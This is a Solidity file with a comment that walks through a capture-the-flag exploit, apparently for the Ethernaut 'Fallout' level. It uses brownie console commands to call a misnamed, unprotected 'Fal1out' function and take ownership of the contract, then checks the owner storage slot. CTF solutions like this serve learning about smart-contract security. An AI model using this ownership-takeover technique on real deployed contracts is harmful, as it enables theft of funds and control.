/*

In this challenge we notice that the Fal'1'out function is not the constructor and instead is a regular function
that can be called by anyone



# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")

# call Fal1out function

accounts[0].transfer(to="contract address",data=web3.keccak(text='Fal1out()')[0:4])

#OR : use interface below

fallout = interface.Fallout("contract address")

fallout.Fal1out()

# confirm owner is your addresss

web3.eth.getStorageAt("contract address",1)


submit your instance

*/

//SPDX-License-Identifier
pragma solidity 0.8.6;

interface Fallout {

    function Fal1out() external;
}